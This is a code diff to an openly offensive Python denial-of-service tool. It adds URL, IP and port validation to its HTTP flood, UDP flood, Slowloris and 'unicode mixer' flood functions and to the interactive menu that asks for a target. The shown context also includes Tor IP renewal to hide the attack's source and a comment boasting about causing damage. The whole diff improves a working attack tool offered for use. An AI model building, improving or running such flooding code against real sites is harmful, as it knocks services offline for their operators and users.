@@ -12,6 +12,7 @@ import logging
 import requests
 from stem import Signal
 from stem.control import Controller
+import validators
 
 # ================= CONFIGURATION =================
 
@@ -155,6 +156,10 @@ def renew_tor_ip():
 
 def http_flood(target_url, num_requests, user_agent, proxy=None, tor=False):
     global attack_running
+    # Validate target_url
+    if not validators.url(target_url):
+        log_action(f"{RED}Invalid URL: {target_url}{RESET}")
+        return  # Exit the function if the URL is invalid
     try:
         for _ in range(num_requests):
             if not attack_running:
@@ -238,6 +243,18 @@ def http_flood(target_url, num_requests, user_agent, proxy=None, tor=False):
 
 def udp_flood(target_ip, target_port, packet_size, num_packets):
     global attack_running
+
+    # Validate target_ip
+    try:
+        socket.inet_aton(target_ip)  # Check if it's a valid IP address
+    except socket.error:
+        log_action(f"{RED}Invalid IP address: {target_ip}{RESET}")
+        return  # Exit if the IP is invalid
+
+    # Validate target_port
+    if not 1 <= target_port <= 65535:
+        log_action(f"{RED}Invalid port: {target_port}{RESET}")
+        return  # Exit if the port is invalid
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         for _ in range(num_packets):
@@ -253,6 +270,10 @@ def udp_flood(target_ip, target_port, packet_size, num_packets):
 
 def slowloris(target_url):
     global attack_running
+    # Validate target_url
+    if not validators.url(target_url):
+        log_action(f"{RED}Invalid URL: {target_url}{RESET}")
+        return  # Exit if the URL is invalid
     try:
         ip = target_url.split("//")[1].split("/")[0]
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -286,6 +307,10 @@ def slowloris(target_url):
 # HTTP UNICODE MIXER FLOOD - Let's really fuck shit up
 def http_unicode_flood(target_url, num_requests, user_agent):
     global attack_running
+    # Validate target_url
+    if not validators.url(target_url):
+        log_action(f"{RED}Invalid URL: {target_url}{RESET}")
+        return  # Exit if the URL is invalid
     try:
         for _ in range(num_requests):
             if not attack_running:
@@ -341,6 +366,10 @@ def main():
 
     try:
         target_url = input(f"{PURPLE}Enter target URL (e.g., http://example.com): {RESET}")
+        # Validate target_url at the beginning of main
+        if not validators.url(target_url):
+            print(f"{RED}Invalid URL: {target_url}{RESET}")
+            sys.exit(1)
         attack_type = input(f"{PURPLE}Enter attack type (http, udp, slowloris, http_unicode): {RESET}").lower()
 
         if attack_type not in ['http', 'udp', 'slowloris', 'http_unicode']:
@@ -383,7 +412,17 @@ def main():
 
         elif attack_type == 'udp':
             target_ip = input(f"{PURPLE}Enter target IP address: {RESET}")
+            # Validate IP address
+            try:
+                socket.inet_aton(target_ip)
+            except socket.error:
+                print(f"{RED}Invalid IP address: {target_ip}{RESET}")
+                sys.exit(1)
             target_port = int(input(f"{PURPLE}Enter target port: {RESET}"))
+            # Validate port
+            if not 1 <= target_port <= 65535:
+                print(f"{RED}Invalid port number. Port must be between 1 and 65535.{RESET}")
+                sys.exit(1)
             packet_size = int(input(f"{PURPLE}Enter packet size: {RESET}"))
             num_packets = int(input(f"{PURPLE}Enter number of packets per thread: {RESET}"))
             num_threads = int(input(f"{PURPLE}Enter number of threads: {RESET}"))
